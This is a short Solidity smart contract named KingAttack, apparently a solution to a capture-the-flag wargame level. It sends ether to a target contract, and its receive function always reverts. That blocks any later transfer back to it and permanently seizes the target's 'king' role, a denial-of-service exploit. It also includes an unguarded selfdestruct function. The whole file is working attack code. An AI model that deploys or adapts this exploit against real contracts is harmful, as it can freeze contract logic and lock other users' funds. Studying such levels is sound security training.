// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function forward(address payable _dest) public payable {
        (bool sent, bytes memory data) = _dest.call{value: address(this).balance}("");
        require(sent, "Failed to send ether");
    }

    receive() external payable {
        // to be sure that contract can't receive eth
        revert();
    }
    function destroy() public {
        selfdestruct(payable(owner));
    }
}
